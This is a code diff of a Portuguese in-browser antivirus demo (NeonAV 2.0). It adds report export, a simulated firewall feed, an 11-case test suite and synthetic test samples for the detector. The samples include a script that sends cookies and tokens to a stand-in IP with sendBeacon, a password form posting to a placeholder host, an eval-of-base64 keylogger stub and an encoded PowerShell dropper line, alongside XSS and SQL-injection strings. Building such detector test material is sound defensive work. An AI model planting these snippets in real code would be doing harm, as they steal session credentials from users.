+    </head><body><h1>Relatório de Inspeção Estática — NeonAV 2.0</h1><p>Gerado em: ${escapeHTML(formatDate(Date.now()))}</p>
+    <table><thead><tr><th>Item</th><th>Tipo</th><th>Risco</th><th>Score</th><th>Entropia</th><th>SHA-512</th></tr></thead><tbody>
+    ${resultsData.map(r => `<tr><td>${escapeHTML(r.name)}</td><td>${escapeHTML(r.kind)}</td><td>${escapeHTML(r.riskLabel)}</td><td>${r.score}/100</td><td>${r.entropy}</td><td style="font-family:monospace;font-size:11px">${escapeHTML(r.hash)}</td></tr>`).join("")}
+    </tbody></table></body></html>`;
+    downloadBlob(html, `neonav-relatorio-${Date.now()}.html`, "text/html;charset=utf-8");
+    addLog("Relatório HTML exportado.");
+});
+
+/* =========================================================
+   6. AMOSTRAS SINTÉTICAS (INOFENSIVAS)
+========================================================= */
+const SYNTHETIC_SAMPLES = {
+    clean: {
+        name: "[AMOSTRA]_relatorio_mensal.txt",
+        content: "Relatório operacional interno.\nStatus: Normal.\nNenhuma rotina executável presente."
+    },
+    js: {
+        name: "[AMOSTRA]_script_ofuscado.js",
+        content: "// Amostra sintética educativa\nconst payload = atob('YWxlcnQoMSk=');\ndocument.addEventListener('keydown', (e) => eval(payload));"
+    },
+    stealer: {
+        name: "[AMOSTRA]_coletor_sessao.js",
+        content: "// Amostra sintética educativa\nconst data = document.cookie + localStorage.getItem('token');\nnavigator.sendBeacon('http://198.51.100.42/collect', data);"
+    },
+    powershell: {
+        name: "[AMOSTRA]_dropper.ps1",
+        content: "# Amostra sintética educativa\npowershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=\nInvoke-Expression $cmd"
+    },
+    phishing: {
+        name: "[AMOSTRA]_login_falso.html",
+        content: `<!-- Amostra sintética educativa -->\n<form action="http://203.0.113.99/auth" method="POST">\n<input type="password" name="senha">\n</form>`
+    }
+};
+
+document.querySelectorAll("[data-test]").forEach(btn => {
+    btn.addEventListener("click", () => {
+        const key = btn.getAttribute("data-test");
+        const sample = SYNTHETIC_SAMPLES[key];
+        if (!sample) return;
+        const file = new File([sample.content], sample.name, { type: "text/plain" });
+        enqueueFiles([file], true);
+        $("testModal").classList.remove("show");
+    });
+});
+
+/* =========================================================
+   7. SIMULADOR DE FIREWALL / IPS (SEPARADO DO SCANNER REAL)
+========================================================= */
+const SIM_ATTACK_TEMPLATES = {
+    ddos: { label: "DDoS SYN/HTTP Flood", details: "Rajada sintética de 38.000 req/s na porta 443" },
+    xss: { label: "XSS Refletido", details: "Payload <script>alert(1)<\/script> detectado em query string" },
+    sql: { label: "SQL Injection", details: "Assinatura ' OR 1=1 -- UNION SELECT bloqueada no parser" },
+    brute: { label: "Credential Stuffing", details: "95 tentativas de autenticação falhas em 30 segundos" }
+};
+
+let simStats = { ddos: 0, xss: 0, sql: 0, brute: 0 };
+let simEvents = [];
+
+function randomTestIP() {
+    const lastOctet = Math.floor(Math.random() * 250) + 1;
+    return `203.0.113.${lastOctet}`;
 }
 
-function csvEscape(value){
-    return `"${String(value ?? "").replace(/"/g,'""')}"`;
+function triggerSimulatedAttack(type) {
+    const tpl = SIM_ATTACK_TEMPLATES[type] || SIM_ATTACK_TEMPLATES.ddos;
+    const active = $("ipsToggle").checked;
+
+    if (active) {
+        simStats[type]++;
+    }
+
+    simEvents.unshift({
+        id: uuid(),
+        type,
+        title: tpl.label,
+        details: tpl.details,
+        ip: randomTestIP(),
+        blocked: active,
+        timestamp: Date.now()
+    });
+    simEvents = simEvents.slice(0, 40);
+    renderFirewallSim();
 }
 
-function exportCSV(){
-    if(!resultsData.length){ toast("Nenhum resultado"); return; }
-    const headers = ["Arquivo", "Tamanho", "Tipo", "Risco", "Score", "Entropia", "SHA-512", "Regras", "IOCs", "Data"];
-    const rows = resultsData.map(item => [
-        item.name, item.size, item.type, item.riskLabel, item.score,
-        Number(item.entropy || 0).toFixed(2), item.hash,
-        (item.detections || []).map(x => x.rule).join("; "),
-        (item.iocs || []).map(x => x.value).join("; "),
-        formatDate(item.timestamp)
-    ].map(csvEscape).join(","));
+function renderFirewallSim() {
+    $("countDdos").textContent = String(simStats.ddos);
+    $("countXss").textContent = String(simStats.xss);
+    $("countSql").textContent = String(simStats.sql);
+    $("countBrute").textContent = String(simStats.brute);
 
-    const csv = [headers.map(csvEscape).join(","), ...rows].join("\n");
-    downloadFile("\uFEFF" + csv, "neonav-relatorio.csv", "text/csv;charset=utf-8");
-    log("Relatório CSV exportado.", "EXPORT");
-}
+    const feed = $("attackFeed");
+    if (simEvents.length === 0) {
+        feed.innerHTML = `<div class="empty">Nenhum evento simulado registrado. Utilize os botões acima para testar regras WAF/IPS.</div>`;
+        return;
+    }
 
-function exportHTML(){
-    if(!resultsData.length){ toast("Nenhum resultado"); return; }
-    const rows = resultsData.map(item => `
-        <tr>
-        <td>${escapeHTML(item.name)}</td>
-        <td>${escapeHTML(item.riskLabel)}</td>
-        <td>${item.score}</td>
-        <td>${Number(item.entropy||0).toFixed(2)}</td>
-        <td><code>${escapeHTML(item.hash)}</code></td>
-        <td>${escapeHTML((item.reasons||[]).join(" | "))}</td>
-        </tr>
+    feed.innerHTML = simEvents.map(ev => `
+        <div class="attack-item">
+            <div>
+                <span class="attack-type-badge ${escapeHTML(ev.type)}">[SIMULAÇÃO] ${escapeHTML(ev.title)}</span>
+                <div class="attack-ip">Origem RFC-5737: ${escapeHTML(ev.ip)}</div>
+                <div class="attack-details">${escapeHTML(ev.details)} • ${escapeHTML(formatDate(ev.timestamp))}</div>
+            </div>
+            <div>
+                ${ev.blocked
+                    ? `<span class="blocked-badge">✔ MITIGADO</span>`
+                    : `<span class="bypassed-badge">⚠ IPS DESATIVADO</span>`
+                }
+            </div>
+        </div>
     `).join("");
-
-    const html = `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><title>Relatório NeonAV</title><style>body{font-family:Arial;background:#07110b;color:#eafff2;padding:30px;}h1{color:#00ff88;}table{width:100%;border-collapse:collapse;}th,td{padding:10px;border:1px solid #17472d;text-align:left;}th{background:#0c2417;}code{font-size:10px;word-break:break-all;}</style></head><body><h1>NeonAV Secure PRO ULTRA</h1><p>Relatório gerado em ${escapeHTML(formatDate(Date.now()))}</p><table><thead><tr><th>Arquivo</th><th>Risco</th><th>Score</th><th>Entropia</th><th>SHA-512</th><th>Indicadores</th></tr></thead><tbody>${rows}</tbody></table></body></html>`;
-    downloadFile(html, "neonav-relatorio.html", "text/html;charset=utf-8");
-    log("Relatório HTML exportado.", "EXPORT");
 }
 
 /* =========================================================
-   EVENTOS & LABORATÓRIO
+   8. SUÍTE DE TESTES AUTOMATIZADOS (11 ASSERÇÕES)
 ========================================================= */
-function addFiles(files){
-    const incoming = Array.from(files || []);
-    if(!incoming.length) return;
-    filesQueue.push(...incoming);
-    log(`${incoming.length} arquivo(s) adicionado(s) à fila.`, "QUEUE");
-    progressText.textContent = `${filesQueue.length} arquivo(s) aguardando análise.`;
-    toast(`${filesQueue.length} arquivo(s) na fila`);
+async function runAutomatedTestSuite() {
+    const t0 = performance.now();
+    const cases = [];
+
+    async function assertCase(name, fn) {
+        try {
+            await fn();
+            cases.push({ name, passed: true, detail: "Asserção validada com sucesso." });
+        } catch (err) {
+            cases.push({ name, passed: false, detail: err.message });
+        }
+    }
+
+    // 1. Sanitização XSS
+    await assertCase("1. Sanitização XSS (escapeHTML)", () => {
+        const out = escapeHTML(`<img src=x onerror="alert('xss')">`);
+        if (out.includes("<") || out.includes(">") || out.includes('"')) {
+            throw new Error("Caracteres perigosos não foram escapados.");
+        }
+    });
+
+    // 2. Validação de URL
+    await assertCase("2. Validação de Entrada de URL (Bloqueio de Esquema Inválido)", () => {
+        const bad = validateURLInput("javascript:alert(1)");
+        if (bad.valid) throw new Error("Esquema javascript: deveria ser bloqueado.");
+        const good = validateURLInput("https://example.com/login");
+        if (!good.valid) throw new Error("URL HTTPS válida foi rejeitada.");
+    });
+
+    // 3. Limite de Arquivo
+    await assertCase("3. Validação de Limite de Arquivo", () => {
+        const oversized = validateFileInput({ name: "grande.bin", size: 20 * 1024 * 1024 }, 10);
+        if (oversized.valid) throw new Error("Arquivo acima do limite deveria falhar.");
+    });
+
+    // 4. Entropia de Shannon
+    await assertCase("4. Cálculo Real de Entropia de Shannon", () => {
+        const uniform = new Uint8Array(256);
+        for (let i = 0; i < 256; i++) uniform[i] = i;
+        const h = calculateShannonEntropy(uniform);
+        if (Math.abs(h - 8.0) > 0.01) throw new Error(`Esperado ~8.0, obtido ${h}`);
+    });
+
+    // 5. SHA-512
+    await assertCase("5. Integridade Criptográfica SHA-512 (WebCrypto)", async () => {
+        const buf = new TextEncoder().encode("NeonAV").buffer;
+        const digest = await computeSHA512(buf);
+        if (digest.length !== 128) throw new Error(`Tamanho de SHA-512 inválido: ${digest.length}`);
+    });
+
+    // 6. Detecção Heurística em Amostra Suspeita
+    await assertCase("6. Detecção Heurística em Amostra Sintética Suspeita", async () => {
+        const buf = new TextEncoder().encode("powershell.exe -EncodedCommand AAA; eval(atob('x'))").buffer;
+        const res = await analyzeFileBuffer({ name: "teste.ps1", size: buf.byteLength, buffer: buf, isSynthetic: true }, {
+            urls: true, entropy: true, extension: true, ioc: true
+        });
+        if (res.score < 50) throw new Error(`Score esperado >= 50, obtido ${res.score}`);
+    });
+
+    // 7. Classificação em Arquivo Limpo
+    await assertCase("7. Classificação Limpa em Arquivo Inofensivo", async () => {
+        const buf = new TextEncoder().encode("Apenas texto simples de documentação.").buffer;
+        const res = await analyzeFileBuffer({ name: "notas.txt", size: buf.byteLength, buffer: buf, isSynthetic: true }, {
+            urls: true, entropy: true, extension: true, ioc: true
+        });
+        if (res.riskLevel !== "low") throw new Error(`Esperado risco 'low', obtido '${res.riskLevel}'`);
+    });
+
+    // 8. Classificação de Risco (classifyRisk)
+    await assertCase("8. Classificação de Risco (classifyRisk - Faixas e Limites)", () => {
+        if (classifyRisk(0).level !== "low" || classifyRisk(24).level !== "low") {
+            throw new Error("Faixa baixa (0-24) falhou.");
+        }
+        if (classifyRisk(25).level !== "medium" || classifyRisk(49).level !== "medium") {
+            throw new Error("Faixa média (25-49) falhou.");
+        }
+        if (classifyRisk(50).level !== "high" || classifyRisk(74).level !== "high") {
+            throw new Error("Faixa alta (50-74) falhou.");
+        }
+        if (classifyRisk(75).level !== "critical" || classifyRisk(100).level !== "critical") {
+            throw new Error("Faixa crítica (75-100) falhou.");
+        }
+    });
+
+    // 9. Ordenação por Score e Tamanho
+    await assertCase("9. Ordenação por Score e Tamanho (sortReports)", () => {
+        const sample = [
+            { name: "a.txt", score: 15, size: 5000, timestamp: 1 },
+            { name: "b.exe", score: 88, size: 200, timestamp: 2 },
+            { name: "c.js", score: 42, size: 12000, timestamp: 3 }
+        ];
+        const byScore = sortReports(sample, "score");
+        if (byScore[0].name !== "b.exe" || byScore[2].name !== "a.txt") {
+            throw new Error("Ordenação por score incorreta.");
+        }
+        const bySize = sortReports(sample, "size");
+        if (bySize[0].name !== "c.js" || bySize[2].name !== "b.exe") {
+            throw new Error("Ordenação por tamanho incorreta.");
+        }
+    });
+
+    // 10. Filtros por Risco e Busca por IOC/Hash
+    await assertCase("10. Filtros de Risco e Busca por IOC/Hash (filterReports)", () => {
+        const sample = [
+            { name: "dropper.ps1", hash: "abc123", riskLevel: "critical", iocs: ["203.0.113.10"] },
+            { name: "readme.md", hash: "def456", riskLevel: "low", iocs: [] }
+        ];
+        const onlyCritical = filterReports(sample, { risk: "critical", query: "" });
+        if (onlyCritical.length !== 1 || onlyCritical[0].name !== "dropper.ps1") {
+            throw new Error("Filtro por nível de risco falhou.");
+        }
+        const byIoc = filterReports(sample, { risk: "all", query: "203.0.113.10" });
+        if (byIoc.length !== 1) {
+            throw new Error("Busca textual por IOC falhou.");
+        }
+    });
+
+    // 11. Exportação JSON e CSV
+    await assertCase("11. Geração e Integridade de Exportação JSON e CSV", () => {
+        const sample = [{
+            name: 'payload,"especial".js',
+            kind: "AMOSTRA SINTÉTICA",
+            riskLabel: "ALTO",
+            score: 65,
+            size: 1024,
+            entropy: 5.42,
+            hash: "0".repeat(128),
+            timestamp: 1700000000000
+        }];
+        const jsonStr = buildJSONExport(sample);
+        const parsed = JSON.parse(jsonStr);
+        if (!Array.isArray(parsed) || parsed[0].score !== 65) {
+            throw new Error("Exportação JSON inválida.");
+        }
+        const csvStr = buildCSVExport(sample);
+        const lines = csvStr.split("\n");
+        if (lines.length !== 2 || !lines[1].includes('"payload,""especial"".js"')) {
+            throw new Error("Escape de aspas no CSV falhou.");
+        }
+    });
+
+    const elapsed = (performance.now() - t0).toFixed(1);
+    const passed = cases.filter(c => c.passed).length;
+    const failed = cases.length - passed;
+
+    $("qaTotal").textContent = String(cases.length);
+    $("qaPassed").textContent = String(passed);
+    $("qaFailed").textContent = String(failed);
+    $("qaTime").textContent = `${elapsed} ms`;
+
+    $("qaResults").innerHTML = cases.map(c => `
+        <div class="test-case ${c.passed ? "pass" : "fail"}">
+            <div>
+                <strong>${escapeHTML(c.name)}</strong>
+                <div class="meta">${escapeHTML(c.detail)}</div>
+            </div>
+            <span class="badge ${c.passed ? "low" : "critical"}">${c.passed ? "PASS" : "FAIL"}</span>
+        </div>
+    `).join("");
+
+    addLog(`Suíte QA (11 testes) executada: ${passed}/${cases.length} aprovados em ${elapsed} ms.`);
 }
 
-selectBtn.addEventListener("click", () => fileInput.click());
-fileInput.addEventListener("change", event => { addFiles(event.target.files); fileInput.value = ""; });
+/* =========================================================
+   9. EVENT LISTENERS & INICIALIZAÇÃO
+========================================================= */
+function switchTab(tabId) {
+    document.querySelectorAll(".tab-btn").forEach(b => b.classList.toggle("active", b.dataset.tab === tabId));
+    document.querySelectorAll(".tab-content").forEach(c => c.classList.toggle("active", c.id === tabId));
+}
 
-["dragenter", "dragover"].forEach(name => {
-    dropzone.addEventListener(name, e => { e.preventDefault(); dropzone.classList.add("drag"); });
+document.querySelectorAll(".tab-btn").forEach(btn => {
+    btn.addEventListener("click", () => switchTab(btn.dataset.tab));
 });
-["dragleave", "drop"].forEach(name => {
-    dropzone.addEventListener(name, e => { e.preventDefault(); dropzone.classList.remove("drag"); });
+
+$("coverStartBtn").addEventListener("click", () => $("coverScreen").classList.add("hidden"));
+$("coverTestBtn").addEventListener("click", () => {
+    $("coverScreen").classList.add("hidden");
+    $("testModal").classList.add("show");
 });
-dropzone.addEventListener("drop", e => addFiles(e.dataTransfer.files));
-scanBtn.addEventListener("click", scanFiles);
+$("coverQaBtn").addEventListener("click", () => {
+    $("coverScreen").classList.add("hidden");
+    switchTab("qaTab");
+    runAutomatedTestSuite();
+});
 
-searchInput.addEventListener("input", renderResults);
-riskFilter.addEventListener("change", renderResults);
-sortSelect.addEventListener("change", renderResults);
+$("selectBtn").addEventListener("click", () => $("fileInput").click());
+$("fileInput").addEventListener("change", e => {
+    if (e.target.files?.length) enqueueFiles(e.target.files, false);
+    e.target.value = "";
+});
 
-resultsBox.addEventListener("click", async event => {
-    const copy = event.target.closest("[data-copy]");
-    if(copy){
-        const hash = copy.getAttribute("data-copy");
-        if(!hash) return;
-        try {
-            await navigator.clipboard.writeText(hash);
-            toast("SHA-512 copiado");
-        } catch { toast("Não foi possível copiar"); }
+const dropzone = $("dropzone");
+dropzone.addEventListener("dragover", e => { e.preventDefault(); dropzone.classList.add("drag"); });
+dropzone.addEventListener("dragleave", () => dropzone.classList.remove("drag"));
+dropzone.addEventListener("drop", e => {
+    e.preventDefault();
+    dropzone.classList.remove("drag");
+    if (e.dataTransfer?.files?.length) enqueueFiles(e.dataTransfer.files, false);
+});
+
+$("scanBtn").addEventListener("click", processQueue);
+
+$("scanUrlBtn").addEventListener("click", async () => {
+    const msgEl = $("urlValidationMsg");
+    msgEl.textContent = "";
+    const check = validateURLInput($("urlInput").value);
+    if (!check.valid) {
+        msgEl.textContent = check.error;
+        addLog(`URL rejeitada na validação: ${check.error}`, "warn");
+        return;
     }
-    const exportButton = event.target.closest("[data-export]");
-    if(exportButton){
-        const id = exportButton.getAttribute("data-export");
-        const item = resultsData.find(x => x.id === id);
-        if(!item) return;
-        downloadFile(JSON.stringify(item, null, 2), "neonav-"+item.name+".json", "application/json");
-    }
+
+    const report = await analyzeURLStatic(check.url);
+    resultsData.unshift(report);
+    saveState();
+    updateMetricsUI();
+    renderResults();
+    $("urlInput").value = "";
+    addLog(`URL analisada estaticamente: ${report.name} [${report.riskLabel}]`);
+});
+
+$("testBtn").addEventListener("click", () => $("testModal").classList.add("show"));
+$("closeModal").addEventListener("click", () => $("testModal").classList.remove("show"));
+$("testModal").addEventListener("click", e => {
+    if (e.target === $("testModal")) $("testModal").classList.remove("show");
+});
+document.addEventListener("keydown", e => {
+    if (e.key === "Escape") $("testModal").classList.remove("show");
 });
 
 $("clearBtn").addEventListener("click", () => {
-    if(!confirm("Limpar histórico e resultados?")) return;
+    fileQueue = [];
     resultsData = [];
-    filesQueue = [];
     localStorage.removeItem(STORAGE_KEY);
+    updateQueueUI();
+    updateMetricsUI();
     renderResults();
-    updateDashboard();
-    progressBar.style.width = "0%";
-    progressText.textContent = "Histórico limpo.";
-    log("Histórico removido.", "CLEAR");
+    $("progressBar").style.width = "0%";
+    $("progressText").textContent = "Histórico e fila limpos.";
+    addLog("Histórico de laudos e fila removidos.");
 });
 
-$("jsonBtn").addEventListener("click", exportJSON);
-$("csvBtn").addEventListener("click", exportCSV);
-$("htmlBtn").addEventListener("click", exportHTML);
+$("searchInput").addEventListener("input", renderResults);
+$("riskFilter").addEventListener("change", renderResults);
+$("sortSelect").addEventListener("change", renderResults);
 
-$("testBtn").addEventListener("click", () => testModal.classList.add("show"));
-$("closeModal").addEventListener("click", () => testModal.classList.remove("show"));
-testModal.addEventListener("click", e => { if(e.target === testModal) testModal.classList.remove("show"); });
-
-const TEST_CONTENT = {
-    clean: `NeonAV Secure PRO ULTRA\nArquivo de teste limpo.\nNenhum indicador especial.`,
-    js: `function teste(){\ndocument.addEventListener("keydown", function(event){ console.log(event.key); });\nconst encoded = atob("VGVzdGU=");\n}`,
-    stealer: `const data = localStorage.getItem("token");\nconst cookie = document.cookie;\nfetch("https://example.invalid/api", { method:"POST", body:data });`,
-    powershell: `powershell.exe\n-EncodedCommand\nInvoke-Expression\nSet-ExecutionPolicy`,
-    phishing: `<!DOCTYPE html><html><body><form action="http://malicious-external-server.invalid/capture" method="POST"><input type="text" name="username"><input type="password" name="password"><button type="submit">Entrar</button></form></body></html>`,
-    critical: `document.onkeydown = function(e){ console.log(e.key); };\ndocument.cookie;\nlocalStorage.getItem("password");\npowershell.exe -EncodedCommand AAAA\n`
-};
-
-function createTestFile(type){
-    const content = TEST_CONTENT[type];
-    if(!content) return;
-    const names = {
-        clean:"neonav-teste-limpo.txt",
-        js:"neonav-teste-javascript.js",
-        stealer:"neonav-teste-stealer.txt",
-        powershell:"neonav-teste-powershell.ps1",
-        phishing:"neonav-teste-phishing.html",
-        critical:"neonav-teste-critico.txt"
-    };
-    const blob = new Blob([content], { type:"text/plain" });
-    const file = new File([blob], names[type], { type:"text/plain", lastModified:Date.now() });
-    addFiles([file]);
-    testModal.classList.remove("show");
-}
-
-testModal.addEventListener("click", event => {
-    const button = event.target.closest("[data-test]");
-    if(button) createTestFile(button.getAttribute("data-test"));
+$("simulateAttackBtn").addEventListener("click", () => {
+    const keys = Object.keys(SIM_ATTACK_TEMPLATES);
+    triggerSimulatedAttack(keys[Math.floor(Math.random() * keys.length)]);
 });
 
-// Inicialização
-loadHistory();
-loadFirewallData();
-updateDashboard();
+$("simTriggerGroup").addEventListener("click", e => {
+    const btn = e.target.closest("[data-attack]");
+    if (btn) triggerSimulatedAttack(btn.dataset.attack);
+});
+
+$("clearAttacksBtn").addEventListener("click", () => {
+    simStats = { ddos: 0, xss: 0, sql: 0, brute: 0 };
+    simEvents = [];
+    renderFirewallSim();
+});
+
+$("runTestsBtn").addEventListener("click", runAutomatedTestSuite);
+
+// Boot
+loadState();
+updateQueueUI();
+updateMetricsUI();
 renderResults();
-renderFirewallStats();
-renderFirewallFeed();
+renderFirewallSim();
+addLog("NeonAV Secure PRO ULTRA 2.0 inicializado com 11 testes QA integrados.");
 </script>
-
 </body>
 </html>
